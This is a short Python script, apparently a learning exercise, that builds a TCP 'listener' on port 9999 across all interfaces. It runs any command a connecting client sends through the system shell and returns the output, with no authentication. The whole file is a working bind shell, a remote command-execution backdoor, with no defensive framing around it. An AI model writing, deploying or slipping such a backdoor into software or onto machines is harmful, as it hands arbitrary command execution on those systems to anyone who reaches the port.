# building a listener

import socket
import subprocess

IP = "0.0.0.0"
PORT = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((IP, PORT))

server.listen(5)
print(f"[*] Server is listening on {IP}:{PORT}")

client_socket, client_address = server.accept()
print(f"[*] Accepted connection from {client_address[0]}: {client_address[1]}")

while True:
    command = client_socket.recv(4096).decode().strip()
    
    if not command:
        continue
    
    if command.lower() in ("exit", "quit"):
        print(f"[*] Client request exit - connection is closing")
        break
    
    try:
        output = subprocess.check_output(command, shell = True, stderr = subprocess.STDOUT)
        
    except subprocess.CalledProcessError as e: #command run but returned a non-zer0 exit code
        output = e.output
        
    client_socket.send(output)
    
client_socket.close()
server.close()
        